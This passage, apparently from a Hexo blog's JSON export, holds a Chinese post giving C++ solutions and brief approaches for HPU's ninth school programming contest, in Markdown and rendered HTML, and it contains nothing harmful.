if(ans=='2')cout<<\"The second is very color.\"<<endl;\n\telse if(ans=='3')cout<<\"San Jiu tian xia di yi!\"<<endl;\n\telse if(ans=='4')cout<<\"Four leaves kawaii.\"<<endl;\n\telse cout<<\"May daughter.\"<<endl;\n\treturn 0;\n}\n```\n\n<!--more-->\n## B.权力的游戏\n题目链接: https://hpuoj.com/contest/18/problem/B/\n思路: 仍旧是 $map$ 统计每个数字出现次数,出现次数为奇数的输出一下就行了.\n代码:\n```\n#include<bits/stdc++.h>\nusing namespace std;\nint main()\n{\n\tint N,flag=0;\n\tmap<int,int>M;\n\twhile(cin>>N)M[N]++;\n\tmap<int,int>::iterator it;\n\tfor(it=M.begin();it!=M.end();it++)\n\t{\n\t\tif(it->second%2)\n\t\t{\n\t\t\tif(flag==0)\n\t\t\t{\n\t\t\t\tcout<<it->first;\n\t\t\t\tflag=1;\n\t\t\t}\n\t\t\telse cout<<' '<<it->first;\n\t\t}\n\t}\n\tcout<<endl;\n\treturn 0;\n}\n```\n\n# 正式赛\n## A.Asia区域赛\n题目链接: https://hpuoj.com/contest/16/problem/A/\n思路: 大水题一个,计算奖牌个数=29金+59银+87铜+11最快解题+1最佳女队+1顽强拼搏=187个,输出187即可.\n代码:\n```\n#include<bits/stdc++.h>\ntypedef long long ll;\nusing namespace std;\nint main()\n{\n\tcout<<187<<endl;\n\treturn 0;\n}\n```\n\n## B.Asia区域制\n题目链接: https://hpuoj.com/contest/16/problem/B/\n思路: 二进制转十六进制,每四位转化一下输出即可,注意要先转化前面不足四位的.\n代码:\n```\n#include<bits/stdc++.h>\ntypedef long long ll;\nusing namespace std;\nchar x[20]=\"0123456789abcdef\";\nstring s;\nint POW(int a,int b)\n{\n\tint ans=1;\n\tfor(int i=0;i<b;i++)\n\t\tans*=a;\n\treturn ans;\n}\nint main()\n{\n\tint T,l,ans;\n\tcin>>T;\n\twhile(T--)\n\t{\n\t\tans=0;\n\t\tcin>>s;\n\t\tl=s.length();\n\t\tfor(int i=l%4-1;i>=0;i--)\n\t\t\tif(s[i]=='1')\n\t\t\tans+=POW(2,l%4-i-1);\n\t\tif(l%4)cout<<x[ans];\n\t\tfor(int i=l%4;i<l;i++)\n\t\t{\n\t\t\tans=0;\n\t\t\tfor(int j=0;j<4;j++)\n\t\t\t\tif(s[i+j]=='1')\n\t\t\t\tans+=POW(2,3-j);\n\t\t\tcout<<x[ans];\n\t\t\ti+=3;\n\t\t}\n\t\tcout<<endl;\n\t}\n\treturn 0;\n}\n```\n\n## C.Asia区域宫\n题目链接: https://hpuoj.com/contest/16/problem/C/\n思路: 注意加粗字体 **\"障碍物在迷宫中不能同行且不能同列\"**,说明只有把与副对角线平行的路线堵死之后才输出 No ,其余情况输出皆为 2*$n$-2.\n代码:\n```\n代码暂无\n```\n\n## D.Asia区域阵\n题目链接: https://hpuoj.com/contest/16/problem/D/\n思路: 思路暂无\n代码:\n```\n代码暂无\n```\n\n## E.Mo的游戏\n题目链接: https://hpuoj.com/contest/16/problem/E/\n思路: $map$记录相同字符之间的最短距离,建一个数组记录此字符上次出现的位置.for循环遍历一遍即可.\n代码:\n```\n#include<bits/stdc++.h>\ntypedef long long ll;\nusing namespace std;\nint a[200];\nint M[200];\nint main()\n{\n\tstring s;\n\tmemset(M,-1,sizeof(M));\n\tcin>>s;\n\tfor(int i=0;i<s.length();i++)\n\t{\n\t\tif(M[s[i]]==-1)\n\t\t{\n\t\t\tM[s[i]]++;\n\t\t\ta[s[i]]=i+1;\n\t\t}\n\t\telse\n\t\t{\n\t\t\tif(M[s[i]]==0)M[s[i]]=i+1-a[s[i]];\n\t\t\tif(i+1-a[s[i]]<M[s[i]])\n\t\t\t\tM[s[i]]=i+1-a[s[i]];\n\t\t\ta[s[i]]=i+1;\n\t\t}\n\t}\n\tfor(char i='a';i<='z';i++)\n\t\tif(M[i]==0)cout<<i<<':'<<0<<endl;\n\t\telse if(M[i]!=-1)cout<<i<<':'<<s.length()-M[i]<<endl;\n\tfor(char i='A';i<='Z';i++)\n\t\tif(M[i]==0)cout<<i<<':'<<0<<endl;\n\t\telse if(M[i]!=-1)cout<<i<<':'<<s.length()-M[i]<<endl;\n\treturn 0;\n}\n```\n\n## F.Mo的极限\n题目链接: https://hpuoj.com/contest/16/problem/F/\n思路: 思路暂无\n代码:\n```\n代码暂无\n```\n\n## G.Mo的数学\n题目链接: https://hpuoj.com/contest/16/problem/G/\n思路: 分解质因数,即$M$的因子的倍数都不和$M$互质,其余的都和$M$互质,此为暴力做法.正解为容斥原理,暂无.\n代码:\n```\n#include<bits/stdc++.h>\n#define MOD 1000000007\ntypedef long long ll;\nusing namespace std;\nbool zhi[1000020];\nint N,M;\nvoid gcd(int n)\n{\n\tfor(int i=2;i*i<=n;i++)\n\t{\n\t\tif(n%i==0)\n\t\t{\n\t\t\tfor(int j=1;j*i<=N;j++)\n\t\t\t\tzhi[i*j]=1;\n\t\t\tfor(int j=1;j*(n/i)<=N;j++)\n\t\t\t\tzhi[(n/i)*j]=1;\n\t\t}\n\t}\n\tfor(int j=1;j*n<=N;j++)\n\t\tzhi[j*n]=1;\n}\nint main()\n{\n\twhile(cin>>N>>M)\n\t{\n\t\tll ans=1;\n\t\tmemset(zhi,0,sizeof(zhi));\n\t\tgcd(M);\n\t\tfor(int i=2;i<=N;i++)\n\t\t\tif(!zhi[i])ans=ans*i%MOD;\n\t\tcout<<ans<<endl;\n\t}\n\treturn 0;\n}\n\n```\n\n## H.Mo的面积\n题目链接: https://hpuoj.com/contest/16/problem/H/\n思路: 两个矩形右边线中$x$值最小的减去两个矩形左边线中$x$值最大的即为重合矩形在$x$轴方向的长度;两个矩形上边线中$y$值最小的减去两个矩形下边线中$y$值最大的即为重合矩形在$y$轴方向的长度.如果其中一个值小于或等于0,则重合面积为0,否则,即为其乘积.求两矩形总面积减去重合部分面积即为答案.\n代码:\n```\n#include<bits/stdc++.h>\ntypedef long long ll;\nusing namespace std;\nint main()\n{\n\tint a[2][2],b[2][2],x,y;\n\tfor(int i=0;i<2;i++)\n\t\tfor(int j=0;j<2;j++)\n\t\t\tcin>>a[i][j];\n\tfor(int i=0;i<2;i++)\n\t\n\t\tfor(int j=0;j<2;j++)\n\t\t\tcin>>b[i][j];\n\tx=min(a[1][0],b[1][0])-max(a[0][0],b[0][0]);\n\ty=min(a[1][1],b[1][1])-max(a[0][1],b[0][1]);\n\tint s=(a[1][1]-a[0][1])*(a[1][0]-a[0][0])+(b[1][1]-b[0][1])*(b[1][0]-b[0][0]);\n\tif(x*y>0)s-=x*y;\n\tcout<<s<<endl;\n\treturn 0;\n}\n```\n\n## I.安全距离\n题目链接: https://hpuoj.com/contest/16/problem/I/\n思路: 思路暂无\n代码:\n```\n代码暂无\n```\n\n## J.简单递归\n题目链接: https://hpuoj.com/contest/16/problem/J/\n思路: 讲题目代码递归转化为非递归即可.\n代码:\n```\n#include<bits/stdc++.h>\ntypedef long long ll;\nusing namespace std;\nconst int MOD = (int)1e9 + 7;\nint a[1000020];\nvoid init()\n{\n\ta[1]=a[2]=1;\n\tfor(int i=3;i<=1000000;i++)\n\t\ta[i]=((a[i-1]<<1)%MOD+(a[i-2]>>1)%MOD)%MOD;\n}\nint main()\n{\n\tinit();\n\tint T,N;\n\tcin>>T;\n\twhile(T--)\n\t{\n\t\tcin>>N;\n\t\tcout<<a[N]<<endl;\n\t}\n\treturn 0;\n}\n```\n\n## K.高度期望\n题目链接: https://hpuoj.com/contest/16/problem/K/\n思路: 贪心求解,先对树高进行排序,再从低到高遍历即可.\n代码:\n```\n#include<bits/stdc++.h>\ntypedef long long ll;\nusing namespace std;\nint main()\n{\n\tint N,M,a[100020];\n\tll ans=0,res=0;\n\tcin>>N>>M;\n\tfor(int i=0;i<N;i++)\n\t{\n\t\tcin>>a[i];\n\t\tans+=a[i];\n\t}\n\tsort(a,a+N);\n\tfor(int i=0;i<N;i++)\n\t{\n\t\tif(ans>=M*N)break;\n\t\tans+=1000-a[i];\n\t\tres++;\n\t}\n\tcout<<res<<endl;\n\treturn 0;\n}\n```\n\n## L.最优规划\n题目链接: https://hpuoj.com/contest/16/problem/L/\n思路: 思路暂无\n代码:\n```\n代码暂无\n```\n","slug":"HPU第九届校赛","published":1,"updated":"2020-05-11T09:47:45.025Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckieexkav0015qse5hnysf2rb","content":"<h1 id=\"热身赛\"><a href=\"#热身赛\" class=\"headerlink\" title=\"热身赛\"></a>热身赛</h1><h2 id=\"A-三玖天下第一\"><a href=\"#A-三玖天下第一\" class=\"headerlink\" title=\"A.三玖天下第一\"></a>A.三玖天下第一</h2><p>题目链接: <a href=\"https://hpuoj.com/contest/18/problem/A/\">https://hpuoj.com/contest/18/problem/A/</a><br>思路: 很水的一道题, $map$ 统计出现次数最多的数字,判断一下输出就行了.<br>代码:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include&lt;bits&#x2F;stdc++.h&gt;</span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tstring s;</span><br><span class=\"line\">\tmap&lt;char,int&gt;M;</span><br><span class=\"line\">\tcin&gt;&gt;s;</span><br><span class=\"line\">\tint ans&#x3D;0;</span><br><span class=\"line\">\tfor(int i&#x3D;0;i&lt;s.length();i++)</span><br><span class=\"line\">\t\tM[s[i]]++;</span><br><span class=\"line\">\tfor(int i&#x3D;&#39;0&#39;;i&lt;&#x3D;&#39;9&#39;;i++)</span><br><span class=\"line\">\t\tif(M[i]&gt;M[ans])ans&#x3D;i;</span><br><span class=\"line\">\tif(ans&#x3D;&#x3D;&#39;0&#39;)cout&lt;&lt;&quot;Five equal parts.&quot;&lt;&lt;endl;</span><br><span class=\"line\">\telse if(ans&#x3D;&#x3D;&#39;1&#39;)cout&lt;&lt;&quot;One flower gathers people.&quot;&lt;&lt;endl;</span><br><span class=\"line\">\telse if(ans&#x3D;&#x3D;&#39;2&#39;)cout&lt;&lt;&quot;The second is very color.&quot;&lt;&lt;endl;</span><br><span class=\"line\">\telse if(ans&#x3D;&#x3D;&#39;3&#39;)cout&lt;&lt;&quot;San Jiu tian xia di yi!&quot;&lt;&lt;endl;</span><br><span class=\"line\">\telse if(ans&#x3D;&#x3D;&#39;4&#39;)cout&lt;&lt;&quot;Four leaves kawaii.&quot;&lt;&lt;endl;</span><br><span class=\"line\">\telse cout&lt;&lt;&quot;May daughter.&quot;&lt;&lt;endl;</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<a id=\"more\"></a>\n<h2 id=\"B-权力的游戏\"><a href=\"#B-权力的游戏\" class=\"headerlink\" title=\"B.权力的游戏\"></a>B.权力的游戏</h2><p>题目链接: <a href=\"https://hpuoj.com/contest/18/problem/B/\">https://hpuoj.com/contest/18/problem/B/</a><br>思路: 仍旧是 $map$ 统计每个数字出现次数,出现次数为奇数的输出一下就行了.<br>代码:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include&lt;bits&#x2F;stdc++.h&gt;</span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint N,flag&#x3D;0;</span><br><span class=\"line\">\tmap&lt;int,int&gt;M;</span><br><span class=\"line\">\twhile(cin&gt;&gt;N)M[N]++;</span><br><span class=\"line\">\tmap&lt;int,int&gt;::iterator it;</span><br><span class=\"line\">\tfor(it&#x3D;M.begin();it!&#x3D;M.end();it++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tif(it-&gt;second%2)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tif(flag&#x3D;&#x3D;0)</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\tcout&lt;&lt;it-&gt;first;</span><br><span class=\"line\">\t\t\t\tflag&#x3D;1;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\telse cout&lt;&lt;&#39; &#39;&lt;&lt;it-&gt;first;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tcout&lt;&lt;endl;</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"正式赛\"><a href=\"#正式赛\" class=\"headerlink\" title=\"正式赛\"></a>正式赛</h1><h2 id=\"A-Asia区域赛\"><a href=\"#A-Asia区域赛\" class=\"headerlink\" title=\"A.Asia区域赛\"></a>A.Asia区域赛</h2><p>题目链接: <a href=\"https://hpuoj.com/contest/16/problem/A/\">https://hpuoj.com/contest/16/problem/A/</a><br>思路: 大水题一个,计算奖牌个数=29金+59银+87铜+11最快解题+1最佳女队+1顽强拼搏=187个,输出187即可.<br>代码:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include&lt;bits&#x2F;stdc++.h&gt;</span><br><span class=\"line\">typedef long long ll;</span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tcout&lt;&lt;187&lt;&lt;endl;</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"B-Asia区域制\"><a href=\"#B-Asia区域制\" class=\"headerlink\" title=\"B.Asia区域制\"></a>B.Asia区域制</h2><p>题目链接: <a href=\"https://hpuoj.com/contest/16/problem/B/\">https://hpuoj.com/contest/16/problem/B/</a><br>思路: 二进制转十六进制,每四位转化一下输出即可,注意要先转化前面不足四位的.<br>代码:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include&lt;bits&#x2F;stdc++.h&gt;</span><br><span class=\"line\">typedef long long ll;</span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\">char x[20]&#x3D;&quot;0123456789abcdef&quot;;</span><br><span class=\"line\">string s;</span><br><span class=\"line\">int POW(int a,int b)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint ans&#x3D;1;</span><br><span class=\"line\">\tfor(int i&#x3D;0;i&lt;b;i++)</span><br><span class=\"line\">\t\tans*&#x3D;a;</span><br><span class=\"line\">\treturn ans;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint T,l,ans;</span><br><span class=\"line\">\tcin&gt;&gt;T;</span><br><span class=\"line\">\twhile(T--)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tans&#x3D;0;</span><br><span class=\"line\">\t\tcin&gt;&gt;s;</span><br><span class=\"line\">\t\tl&#x3D;s.length();</span><br><span class=\"line\">\t\tfor(int i&#x3D;l%4-1;i&gt;&#x3D;0;i--)</span><br><span class=\"line\">\t\t\tif(s[i]&#x3D;&#x3D;&#39;1&#39;)</span><br><span class=\"line\">\t\t\tans+&#x3D;POW(2,l%4-i-1);</span><br><span class=\"line\">\t\tif(l%4)cout&lt;&lt;x[ans];</span><br><span class=\"line\">\t\tfor(int i&#x3D;l%4;i&lt;l;i++)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tans&#x3D;0;</span><br><span class=\"line\">\t\t\tfor(int j&#x3D;0;j&lt;4;j++)</span><br><span class=\"line\">\t\t\t\tif(s[i+j]&#x3D;&#x3D;&#39;1&#39;)</span><br><span class=\"line\">\t\t\t\tans+&#x3D;POW(2,3-j);</span><br><span class=\"line\">\t\t\tcout&lt;&lt;x[ans];</span><br><span class=\"line\">\t\t\ti+&#x3D;3;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\tcout&lt;&lt;endl;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"C-Asia区域宫\"><a href=\"#C-Asia区域宫\" class=\"headerlink\" title=\"C.Asia区域宫\"></a>C.Asia区域宫</h2><p>题目链接: <a href=\"https://hpuoj.com/contest/16/problem/C/\">https://hpuoj.com/contest/16/problem/C/</a><br>思路: 注意加粗字体 <strong>“障碍物在迷宫中不能同行且不能同列”</strong>,说明只有把与副对角线平行的路线堵死之后才输出 No ,其余情况输出皆为 2*$n$-2.<br>代码:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">代码暂无</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"D-Asia区域阵\"><a href=\"#D-Asia区域阵\" class=\"headerlink\" title=\"D.Asia区域阵\"></a>D.Asia区域阵</h2><p>题目链接: <a href=\"https://hpuoj.com/contest/16/problem/D/\">https://hpuoj.com/contest/16/problem/D/</a><br>思路: 思路暂无<br>代码:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">代码暂无</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"E-Mo的游戏\"><a href=\"#E-Mo的游戏\" class=\"headerlink\" title=\"E.Mo的游戏\"></a>E.Mo的游戏</h2><p>题目链接: <a href=\"https://hpuoj.com/contest/16/problem/E/\">https://hpuoj.com/contest/16/problem/E/</a><br>思路: $map$记录相同字符之间的最短距离,建一个数组记录此字符上次出现的位置.for循环遍历一遍即可.<br>代码:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include&lt;bits&#x2F;stdc++.h&gt;</span><br><span class=\"line\">typedef long long ll;</span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\">int a[200];</span><br><span class=\"line\">int M[200];</span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tstring s;</span><br><span class=\"line\">\tmemset(M,-1,sizeof(M));</span><br><span class=\"line\">\tcin&gt;&gt;s;</span><br><span class=\"line\">\tfor(int i&#x3D;0;i&lt;s.length();i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tif(M[s[i]]&#x3D;&#x3D;-1)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tM[s[i]]++;</span><br><span class=\"line\">\t\t\ta[s[i]]&#x3D;i+1;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\telse</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tif(M[s[i]]&#x3D;&#x3D;0)M[s[i]]&#x3D;i+1-a[s[i]];</span><br><span class=\"line\">\t\t\tif(i+1-a[s[i]]&lt;M[s[i]])</span><br><span class=\"line\">\t\t\t\tM[s[i]]&#x3D;i+1-a[s[i]];</span><br><span class=\"line\">\t\t\ta[s[i]]&#x3D;i+1;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tfor(char i&#x3D;&#39;a&#39;;i&lt;&#x3D;&#39;z&#39;;i++)</span><br><span class=\"line\">\t\tif(M[i]&#x3D;&#x3D;0)cout&lt;&lt;i&lt;&lt;&#39;:&#39;&lt;&lt;0&lt;&lt;endl;</span><br><span class=\"line\">\t\telse if(M[i]!&#x3D;-1)cout&lt;&lt;i&lt;&lt;&#39;:&#39;&lt;&lt;s.length()-M[i]&lt;&lt;endl;</span><br><span class=\"line\">\tfor(char i&#x3D;&#39;A&#39;;i&lt;&#x3D;&#39;Z&#39;;i++)</span><br><span class=\"line\">\t\tif(M[i]&#x3D;&#x3D;0)cout&lt;&lt;i&lt;&lt;&#39;:&#39;&lt;&lt;0&lt;&lt;endl;</span><br><span class=\"line\">\t\telse if(M[i]!&#x3D;-1)cout&lt;&lt;i&lt;&lt;&#39;:&#39;&lt;&lt;s.length()-M[i]&lt;&lt;endl;</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"F-Mo的极限\"><a href=\"#F-Mo的极限\" class=\"headerlink\" title=\"F.Mo的极限\"></a>F.Mo的极限</h2><p>题目链接: <a href=\"https://hpuoj.com/contest/16/problem/F/\">https://hpuoj.com/contest/16/problem/F/</a><br>思路: 思路暂无<br>代码:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">代码暂无</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"G-Mo的数学\"><a href=\"#G-Mo的数学\" class=\"headerlink\" title=\"G.Mo的数学\"></a>G.Mo的数学</h2><p>题目链接: <a href=\"https://hpuoj.com/contest/16/problem/G/\">https://hpuoj.com/contest/16/problem/G/</a><br>思路: 分解质因数,即$M$的因子的倍数都不和$M$互质,其余的都和$M$互质,此为暴力做法.正解为容斥原理,暂无.<br>代码:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include&lt;bits&#x2F;stdc++.h&gt;</span><br><span class=\"line\">#define MOD 1000000007</span><br><span class=\"line\">typedef long long ll;</span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\">bool zhi[1000020];</span><br><span class=\"line\">int N,M;</span><br><span class=\"line\">void gcd(int n)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tfor(int i&#x3D;2;i*i&lt;&#x3D;n;i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tif(n%i&#x3D;&#x3D;0)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tfor(int j&#x3D;1;j*i&lt;&#x3D;N;j++)</span><br><span class=\"line\">\t\t\t\tzhi[i*j]&#x3D;1;</span><br><span class=\"line\">\t\t\tfor(int j&#x3D;1;j*(n&#x2F;i)&lt;&#x3D;N;j++)</span><br><span class=\"line\">\t\t\t\tzhi[(n&#x2F;i)*j]&#x3D;1;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tfor(int j&#x3D;1;j*n&lt;&#x3D;N;j++)</span><br><span class=\"line\">\t\tzhi[j*n]&#x3D;1;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\twhile(cin&gt;&gt;N&gt;&gt;M)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tll ans&#x3D;1;</span><br><span class=\"line\">\t\tmemset(zhi,0,sizeof(zhi));</span><br><span class=\"line\">\t\tgcd(M);</span><br><span class=\"line\">\t\tfor(int i&#x3D;2;i&lt;&#x3D;N;i++)</span><br><span class=\"line\">\t\t\tif(!zhi[i])ans&#x3D;ans*i%MOD;</span><br><span class=\"line\">\t\tcout&lt;&lt;ans&lt;&lt;endl;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<h2 id=\"H-Mo的面积\"><a href=\"#H-Mo的面积\" class=\"headerlink\" title=\"H.Mo的面积\"></a>H.Mo的面积</h2><p>题目链接: <a href=\"https://hpuoj.com/contest/16/problem/H/\">https://hpuoj.com/contest/16/problem/H/</a><br>思路: 两个矩形右边线中$x$值最小的减去两个矩形左边线中$x$值最大的即为重合矩形在$x$轴方向的长度;两个矩形上边线中$y$值最小的减去两个矩形下边线中$y$值最大的即为重合矩形在$y$轴方向的长度.如果其中一个值小于或等于0,则重合面积为0,否则,即为其乘积.求两矩形总面积减去重合部分面积即为答案.<br>代码:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include&lt;bits&#x2F;stdc++.h&gt;</span><br><span class=\"line\">typedef long long ll;</span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint a[2][2],b[2][2],x,y;</span><br><span class=\"line\">\tfor(int i&#x3D;0;i&lt;2;i++)</span><br><span class=\"line\">\t\tfor(int j&#x3D;0;j&lt;2;j++)</span><br><span class=\"line\">\t\t\tcin&gt;&gt;a[i][j];</span><br><span class=\"line\">\tfor(int i&#x3D;0;i&lt;2;i++)</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t\tfor(int j&#x3D;0;j&lt;2;j++)</span><br><span class=\"line\">\t\t\tcin&gt;&gt;b[i][j];</span><br><span class=\"line\">\tx&#x3D;min(a[1][0],b[1][0])-max(a[0][0],b[0][0]);</span><br><span 